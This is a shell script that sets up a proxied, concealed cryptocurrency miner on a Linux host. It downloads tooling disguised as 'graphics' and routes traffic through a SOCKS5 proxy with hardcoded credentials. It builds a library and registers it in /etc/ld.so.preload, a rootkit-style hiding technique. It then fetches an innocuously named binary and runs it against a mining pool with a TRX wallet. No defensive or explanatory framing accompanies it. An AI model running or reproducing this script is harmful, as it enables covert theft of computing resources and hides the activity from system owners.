#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
tar -xvzf graphics.tar.gz
cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
select_proxy_mode=socks5_only
socks5 = 51.79.157.223:2082
socks5_username = sshocean-yangkai
socks5_password = 111
END
./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep .2
echo " "
echo " "
echo "**************"
./graftcp/graftcp curl ifconfig.me
echo " "
echo " "
echo "**************"
echo " "
echo " "
git clone https://github.com/scatterfafafa/lib.git
cd lib;make
sudo mv libOmptarget.so /usr/local/lib/;echo /usr/local/lib/libOmptarget.so >> /etc/ld.so.preload
cd ..

./graftcp//graftcp wget https://github.com/mauliki9999/codet/raw/main/rstd
chmod 700 rstd

./graftcp/graftcp ./rstd -a cryptonight-upx/2 -o stratum+tcp://rx-us.unmineable.com:13333 -u TRX:TKSxZAZshLYu2upmp8JJqiSK2jXinmULzM.$(echo rstd/$(shuf -i 1-999 -n 1))#hdij-gkd6 -p --asm=ryzen -t 15  -k -t14 --cpu-priority 5 && sleep 99999999
